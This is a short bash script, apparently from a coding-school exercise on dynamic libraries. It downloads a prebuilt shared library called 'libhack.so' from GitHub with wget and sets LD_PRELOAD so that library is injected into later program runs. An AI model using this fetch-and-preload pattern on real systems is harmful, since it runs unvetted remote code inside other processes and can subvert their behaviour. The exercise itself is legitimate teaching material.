#!/bin/bash
wget -P .. https://raw.githubusercontent.com/JephMelo/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD="$PWD/../libhack.so"
